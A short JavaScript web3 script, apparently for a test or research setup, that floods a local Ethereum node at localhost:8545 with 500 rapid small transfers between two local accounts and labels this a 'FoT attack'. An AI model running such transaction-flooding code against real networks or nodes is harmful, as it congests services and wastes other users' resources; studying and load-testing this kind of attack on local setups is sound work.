const Web3 = require("web3");
const web3 = new Web3.default("http://localhost:8545");

(async () => {
  const accounts = await web3.eth.getAccounts();
  const sender = accounts[0];
  const receiver = accounts[1];

  console.log("Starting FoT attack: sending 500 transactions rapidly...");

  for (let i = 0; i < 500; i++) {
    web3.eth.sendTransaction({
      from: sender,
      to: receiver,
      value: web3.utils.toWei("0.0001", "ether")
    }).then((txHash) => {
      console.log(`Tx ${i + 1} → ${txHash}`);
    }).catch((err) => {
      console.error(`Tx ${i + 1} failed:`, err.message);
    });
  }
})();
